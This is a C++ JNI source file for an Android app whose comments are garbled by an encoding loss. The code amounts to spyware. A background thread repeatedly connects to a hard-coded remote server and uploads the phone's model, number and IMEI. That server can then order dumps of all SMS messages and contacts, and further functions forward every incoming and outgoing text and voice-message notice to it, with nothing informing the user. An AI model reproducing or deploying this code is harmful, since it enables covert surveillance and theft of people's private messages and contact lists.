#include "com_example_myphone_CPhone.h"
#include "common.h"
#include <jni.h>

bool g_bIsRun = false;
static int  g_socket = INVALID_SOCKET;
static JavaVM *g_jvm   = NULL;
jclass g_clsPhoneInof = NULL;
pthread_t g_ptWorkThread = NULL;

//�����־
void ShowLogCat(const char *prefix = NULL)
{
	int errvalue = errno;
	char* ErrMsg = strerror(errvalue);
	if(prefix == NULL)
		__android_log_print(ANDROID_LOG_INFO , TAG, "%s\r\n", ErrMsg);
	else
		__android_log_print(ANDROID_LOG_INFO , TAG, "%s %s\r\n", prefix, ErrMsg);
}

//��jstringתΪchar*
char* jstringToChar(JNIEnv *env, jstring jstr)
{
    char * rtn = NULL;
    jclass clsstring = env->FindClass("java/lang/String");
    jstring strencode = env->NewStringUTF("UTF-8");
    jmethodID mid = env->GetMethodID(clsstring, "getBytes", "(Ljava/lang/String;)[B");
    jbyteArray barr= (jbyteArray)env->CallObjectMethod(jstr,mid,strencode);
    jsize alen = env->GetArrayLength(barr);
    jbyte * ba = env->GetByteArrayElements(barr,JNI_FALSE);
    if(alen > 0)
    {
        rtn = (char*)malloc(alen+1); //new char[alen+1];
        memcpy(rtn,ba,alen);
        rtn[alen]=0;
    }
    env->ReleaseByteArrayElements(barr,ba,0);

    return rtn;
}

void QueryAllSmsMsg(JNIEnv *env, long long lQueryMinDate)
{
	jclass cls_PI = g_clsPhoneInof;
	//�ù��캯��
	jmethodID idPIInit = env->GetMethodID(cls_PI, "<init>", "()V");
	//��������
	jobject objPI = env->NewObject(cls_PI, idPIInit);
	//���ҷ���
	jmethodID idGetAllSmsMsg = env->GetMethodID(cls_PI, "GetAllSmsMsg", "(J)V");
	//��ѯ��Ϣ
	if(DEBUG)
	{
		__android_log_print(ANDROID_LOG_INFO , TAG, "GetAllSmsMsg arg: %lld\r\n", lQueryMinDate);
	}
	env->CallVoidMethod(objPI, idGetAllSmsMsg, lQueryMinDate);
}

//��ȡ�������ֻ���Ϣ
bool GetBasePhoneInfo(JNIEnv *env, BASEPHONEINFO *pPI)
{
	//��PhoneInfo�����
	//ͨ��JavaVM�����AttachCurrentThread�̵߳õ���env�Ҳ����κ������
	//ֻ�������߳���ͨ����ȡ���������ٵ���
	//jclass cls_PI = env->FindClass("com/example/myphone/PhoneInfo");
	jclass cls_PI = g_clsPhoneInof;
	//�ù��캯��
	jmethodID idPIInit = env->GetMethodID(cls_PI, "<init>", "()V");
	//��������
	jobject objPI = env->NewObject(cls_PI, idPIInit);
	//���ҷ���
	jmethodID idGetModel = env->GetMethodID(cls_PI, "getModel", "()Ljava/lang/String;");
	//��ѯ�ֻ��ͺ�
	jstring strModel = (jstring)env->CallObjectMethod(objPI, idGetModel);
	//ת��jstringΪchar*
	char* pStrModel = jstringToChar(env, strModel);
	size_t nStrLen = strlen(pStrModel);
	strcpy(pPI->szPhoneModel, pStrModel);

	//���ҷ���
	idGetModel = env->GetMethodID(cls_PI, "getVersion", "()Ljava/lang/String;");
	//��ѯ�ֻ��ͺ�
	jstring strVersion = (jstring)env->CallObjectMethod(objPI, idGetModel);
	//ת��jstringΪchar*
	char* pStrVersion = jstringToChar(env, strVersion);
	nStrLen = strlen(pStrVersion);
	strcpy(pPI->szSystemVersion, pStrVersion);

	//���ҷ���
	idGetModel = env->GetMethodID(cls_PI, "getNativePhoneNumber", "()Ljava/lang/String;");
	//��ѯ�ֻ�����
	jstring strPhoneNumber = (jstring)env->CallObjectMethod(objPI, idGetModel);
	//ת��jstringΪchar*
	char* pStrPhoneNumber = jstringToChar(env, strPhoneNumber);
	//�ֻ����벻һ��ȫ���õ�
	if(pStrPhoneNumber != NULL)
	{
		nStrLen = strlen(pStrPhoneNumber);
		strcpy(pPI->szPhoneNum, pStrPhoneNumber);
	}

	//���ҷ���
	idGetModel = env->GetMethodID(cls_PI, "getIMEI", "()Ljava/lang/String;");
	//��ѯ�ֻ�IMEI
	jstring strIMEI = (jstring)env->CallObjectMethod(objPI, idGetModel);
	//ת��jstringΪchar*
	char* pStrIMEI = jstringToChar(env, strIMEI);
	nStrLen = strlen(pStrIMEI);
	strcpy(pPI->szIMEI, pStrIMEI);
	return true;
}
/*
 * ������ϵ����Ϣ������
 */
void QueryContactsAndSend(JNIEnv *env)
{
	jclass cls_PI = g_clsPhoneInof;
	//�ù��캯��
	jmethodID idPIInit = env->GetMethodID(cls_PI, "<init>", "()V");
	//��������
	jobject objPI = env->NewObject(cls_PI, idPIInit);
	//���ҷ���
	jmethodID idQCAS = env->GetMethodID(cls_PI, "QueryContactsAndSend", "()V");
	//��ѯ��Ϣ
	if(DEBUG)
	{
		__android_log_print(ANDROID_LOG_INFO , TAG, "calling QueryContactsAndSend");
	}
	env->CallVoidMethod(objPI, idQCAS);
}

/*
 * ����ָ����߳�
 */
void* WorkThread(void *pParam)
{
	if(DEBUG)
		LOGI("WorkThread in!");
	//������������ȡenv����
	JNIEnv *env;
	g_jvm->AttachCurrentThread(&env, NULL);

	MSG_STRUCT ms;
	int nRecv = -1;
	while(g_bIsRun)
	{
		nRecv = recv(g_socket, &ms, sizeof(MSG_STRUCT), 0); //��־��Ҫ��MSG_WAITALL
		//����-1��ʾ����
		if(nRecv == 0)
		{
			break;
		}

		switch(ms.Msg_Head.dwCmdId)
		{
		case MSGTYPE_GETLOCALTION:
			break;
		case MSGTYPE_QUERYAllSMS:
			QueryAllSmsMsg(env, ms.QueryAllSms.lMinDate);
			break;
		case MSGTYPE_QUERYCONTACTS:
			//������ϵ����Ϣ
			QueryContactsAndSend(env);
			break;
		}
	}
	close(g_socket);
	g_socket = INVALID_SOCKET;
	g_bIsRun = false;
	g_jvm->DetachCurrentThread();
	if(DEBUG)
		LOGI("WorkThread out!");
}

/*
 * ���ӷ��������߳�
 */
void* ConnectThread(void *pParam)
{
	if(DEBUG)
		LOGI("ConnectThread in!");
	//������������ȡenv���󣬵��޷����ڲ����࣬���ô�
	JNIEnv *env;
	g_jvm->AttachCurrentThread(&env, NULL);

	while(true)
	{
		sleep(SLEEPTIME);
		if(g_bIsRun == false)
		{
			g_socket = socket(AF_INET, SOCK_STREAM, 0);
			//����-1��ʾ����
			if(g_socket == -1)
			{
				if(DEBUG)
				ShowLogCat("Create Socket error:");
				break;
			}
			sockaddr_in sa;  //#include <netinet/in.h>
			sa.sin_family = AF_INET;
			sa.sin_port = htons(SERVER_PORT);
			sa.sin_addr.s_addr = inet_addr(SERVER_IP); //#include <arpa/inet.h>
			//sa.sin_addr.s_addr = htonl(INADDR_ANY);
			int sockLength = sizeof(sockaddr_in);

			int nConnect = connect(g_socket, (sockaddr*)&sa, sockLength);
			//����-1��ʾ����
			if(nConnect == -1)
			{
				if(DEBUG)
				ShowLogCat("connect:");
				close(g_socket);
				g_socket = INVALID_SOCKET;
				continue;
			}

			if(DEBUG)
				LOGI("connect success!");

			//�ɼ��ֻ�������Ϣ
			MSG_STRUCT ms;
			GetBasePhoneInfo(env, &ms.BasePhoneInfo);
			ms.Msg_Head.dwCmdId = MSGTYPE_BASEPHONEINFO;
			ms.Msg_Head.dwCmdLength = sizeof(MSG_HEAD) + sizeof(BASEPHONEINFO);
			//���͵�������
			ssize_t nSend = send(g_socket, &ms, ms.Msg_Head.dwCmdLength, 0);
			if(nSend != ms.Msg_Head.dwCmdLength)
			{
				close(g_socket);
				g_socket = INVALID_SOCKET;
				continue;
			}
			//����ͨѶ�߳�
			int nResult = pthread_create(&g_ptWorkThread, NULL, &WorkThread, NULL);
			if(EOK == nResult)
			{
				g_bIsRun = true;
				LOGI("create WorkThread success!");
			}
		}
	}
	env->DeleteLocalRef(g_clsPhoneInof);
	g_jvm->DetachCurrentThread();

	if(DEBUG)
		LOGI("ConnectThread out!");
	return NULL;
}

/*
 * ������ϵ�����ݵ�������
 */
JNIEXPORT void JNICALL Java_com_example_myphone_CPhone_SendContacts
  (JNIEnv *env, jobject obj, jbyteArray byteArray, jint nlen)
{
	int nNeedLength = MAXMSGLENGTH < nlen ? MAXMSGLENGTH : nlen;
	int nMsgLength = nNeedLength + sizeof(MSG_HEAD);
	char *pbuf = new char[nMsgLength + 1];
	if(pbuf == NULL)
	{
		if (DEBUG)
		ShowLogCat("SendContacts:");
		return;
	}
	pbuf[nMsgLength] = '\0';
	MSG_STRUCT *pms = (MSG_STRUCT *)pbuf;
	pms->Msg_Head.dwCmdId = MSGTYPE_CONTACTSINFO;
	pms->Msg_Head.dwCmdLength = nMsgLength;
	env->GetByteArrayRegion(byteArray, 0, nNeedLength, (signed char*)&pms->Contacts.szMsg);
	if(DEBUG)
	{
		__android_log_print(ANDROID_LOG_INFO , TAG, "SendContacts length: %d\r\n",
				strlen((char*)pms->Contacts.szMsg) + 8);
		__android_log_print(ANDROID_LOG_INFO , TAG, "%s\r\n", pms->Contacts.szMsg);
	}
	ssize_t nSend;
	if(g_socket != INVALID_SOCKET)
	{
		//���͵�������
		nSend = send(g_socket, pbuf, nMsgLength, 0);
		if(DEBUG)
			__android_log_print(ANDROID_LOG_INFO , TAG, "Send length:%ld\r\n", nSend);
	}
}

/*
 * ��ͨѶ��¼����ʱ֪ͨ������
 */
JNIEXPORT void JNICALL Java_com_example_myphone_CPhone_SendNewVoiceMsg
  (JNIEnv *env, jobject obj, jbyteArray byteArray, jint nlen)
{
	int nNeedLength = MAXMSGLENGTH < nlen ? MAXMSGLENGTH : nlen;
	int nMsgLength = nNeedLength + sizeof(MSG_HEAD);
	char *pbuf = new char[nMsgLength + 1];
	if(pbuf == NULL)
	{
		if (DEBUG)
		ShowLogCat("SendNewVoiceMsg:");
		return;
	}
	pbuf[nMsgLength] = '\0';
	MSG_STRUCT *pms = (MSG_STRUCT *)pbuf;
	pms->Msg_Head.dwCmdId = MSGTYPE_VOICESMS;
	pms->Msg_Head.dwCmdLength = nMsgLength;
	env->GetByteArrayRegion(byteArray, 0, nNeedLength, (signed char*)&pms->NewVoiceMsg.szMsg);
	if(DEBUG)
	{
		__android_log_print(ANDROID_LOG_INFO , TAG, "SendNewVoiceMsg length: %d\r\n",
				strlen((char*)pms->NewSms.szMsg) + 8);
		__android_log_print(ANDROID_LOG_INFO , TAG, "%s\r\n", pms->NewVoiceMsg.szMsg);
	}
	ssize_t nSend;
	if(g_socket != INVALID_SOCKET)
	{
		//���͵�������
		nSend = send(g_socket, pbuf, nMsgLength, 0);
		if(DEBUG)
			__android_log_print(ANDROID_LOG_INFO , TAG, "Send length:%ld\r\n", nSend);
	}
}

/*
 * �½��յ�����ʱ�Ļص�����ɷ��͵��������Ĺ���
 */
JNIEXPORT void JNICALL Java_com_example_myphone_CPhone_SendNewInSms
  (JNIEnv *env, jobject obj, jbyteArray byteArray, jint nlen)
{
	int nNeedLength = MAXMSGLENGTH < nlen ? MAXMSGLENGTH : nlen;
	int nMsgLength = nNeedLength + sizeof(MSG_HEAD);
	char *pbuf = new char[nMsgLength + 1];
	if(pbuf == NULL)
	{
		if (DEBUG)
		ShowLogCat("SendNewInSms:");
		return;
	}
	pbuf[nMsgLength] = '\0';
	MSG_STRUCT *pms = (MSG_STRUCT *)pbuf;
	pms->Msg_Head.dwCmdId = MSGTYPE_SMSIN;
	pms->Msg_Head.dwCmdLength = nMsgLength;
	env->GetByteArrayRegion(byteArray, 0, nNeedLength, (signed char*)&pms->NewSms.szMsg);
	if(DEBUG)
	{
		__android_log_print(ANDROID_LOG_INFO , TAG, "SendNewInSms length: %d\r\n",
				strlen((char*)pms->NewSms.szMsg) + 8);
		__android_log_print(ANDROID_LOG_INFO , TAG, "%s\r\n", pms->NewSms.szMsg);
	}
	ssize_t nSend;
	if(g_socket != INVALID_SOCKET)
	{
		//���͵�������
		nSend = send(g_socket, pbuf, nMsgLength, 0);
		if(DEBUG)
			__android_log_print(ANDROID_LOG_INFO , TAG, "Send length:%ld\r\n", nSend);
	}
}

/*
 * ���ݶ�����Ϣ��������
 */
JNIEXPORT void JNICALL Java_com_example_myphone_CPhone_SendNewOutSms
  (JNIEnv *env, jobject obj, jbyteArray byteArray, jint nlen)
{
	int nNeedLength = MAXMSGLENGTH < nlen ? MAXMSGLENGTH : nlen;
	int nMsgLength = nNeedLength + sizeof(MSG_HEAD);
	char *pbuf = new char[nMsgLength + 1];
	if(pbuf == NULL)
	{
		if (DEBUG)
		ShowLogCat("SendNewOutSms:");
		return;
	}
	pbuf[nMsgLength] = '\0';
	MSG_STRUCT *pms = (MSG_STRUCT *)pbuf;
	pms->Msg_Head.dwCmdId = MSGTYPE_SMSOUT;
	pms->Msg_Head.dwCmdLength = nMsgLength;
	env->GetByteArrayRegion(byteArray, 0, nNeedLength, (signed char*)&pms->NewSms.szMsg);
	if(DEBUG)
	{
		__android_log_print(ANDROID_LOG_INFO , TAG, "SendNewOutSms length: %d\r\n",
				strlen((char*)pms->NewSms.szMsg) + 8);
		__android_log_print(ANDROID_LOG_INFO , TAG, "%s\r\n", pms->NewSms.szMsg);
	}
	ssize_t nSend;
	if(g_socket != INVALID_SOCKET)
	{
		//���͵�������
		nSend = send(g_socket, pbuf, nMsgLength, 0);
		if(DEBUG)
			__android_log_print(ANDROID_LOG_INFO , TAG, "Send length:%ld\r\n", nSend);
	}
}

//�������ж������ݵ�������
JNIEXPORT void JNICALL Java_com_example_myphone_CPhone_SendAllSmsMsg
  (JNIEnv *env, jobject obj, jbyteArray byteArray, jint nlen)
{
	int nNeedLength = MAXMSGLENGTH < nlen ? MAXMSGLENGTH : nlen;
	int nMsgLength = nNeedLength + sizeof(MSG_HEAD);
	char *pbuf = new char[nMsgLength + 1];
	if(pbuf == NULL)
	{
		ShowLogCat("SendAllSmsMsg:");
		return;
	}
	pbuf[nMsgLength] = '\0';
	MSG_STRUCT *pms = (MSG_STRUCT *)pbuf;
	pms->Msg_Head.dwCmdId = MSGTYPE_AllSMSBACK;
	pms->Msg_Head.dwCmdLength = nMsgLength;
	env->GetByteArrayRegion(byteArray, 0, nNeedLength, (signed char*)&pms->AllSms);
	if(DEBUG)
	{
		__android_log_print(ANDROID_LOG_INFO , TAG, "SendAllSmsMsg length: %d\r\n",
				strlen((char*)pms->AllSms.szAllMsg) + 8);
		__android_log_print(ANDROID_LOG_INFO , TAG, "%s\r\n", pms->AllSms.szAllMsg);
	}
	ssize_t nSend;
	if(g_socket != INVALID_SOCKET)
	{
		//���͵�������
		nSend = send(g_socket, pbuf, nMsgLength+2, 0);
		if(DEBUG)
			__android_log_print(ANDROID_LOG_INFO , TAG, "Send length:%ld\r\n", nSend);
	}
}

 /*
 * Method:    Start
 * Signature: ()V
 */
JNIEXPORT void JNICALL Java_com_example_myphone_CPhone_Start
  (JNIEnv *env, jobject obj)
{
	//��ȡ�����ָ��
	env->GetJavaVM(&g_jvm);
	//��PhoneInfo�����������ü������ڸ������߳�ʹ��
	jclass tmp = env->FindClass("com/example/myphone/PhoneInfo");
	g_clsPhoneInof = (jclass)env->NewGlobalRef(tmp);

	pthread_t pt;
	//���������̣߳���һ���������봫
	int nResult = pthread_create(&pt, NULL, &ConnectThread, NULL);
	if(EOK == nResult)
	{
		LOGI("create ConnectThread success!");
	}
}

//��������Activity��ķ������ܵ���
JNIEXPORT jstring JNICALL Java_com_example_myphone_CPhone_GetIEMI
  (JNIEnv *env, jobject mContext)
{
	jclass cls_context = env->FindClass("android/content/Context");
	jmethodID getSystemService =
					env->GetMethodID(cls_context,
							 "getSystemService",
							 "(Ljava/lang/String;)java/lang/Object;");
	jfieldID TELEPHONY_SERVICE =
			env->GetStaticFieldID(cls_context,
					"TELEPHONY_SERVICE",
					"Ljava/lang/String;");
	jstring str = (jstring)env->GetStaticObjectField(cls_context,
			TELEPHONY_SERVICE);

	jobject telephonymanager = env->CallObjectMethod(mContext,
			getSystemService,
			str);

	jclass cls_TelephoneManager = env->FindClass("android/telephony/TelephonyManager");

	jmethodID getDeviceId = env->GetMethodID(cls_TelephoneManager,
			"getDeviceId",
			"()Ljava/lang/String;");

	jobject DeviceID = env->CallObjectMethod(telephonymanager,
			getDeviceId);

	return (jstring)DeviceID;
}
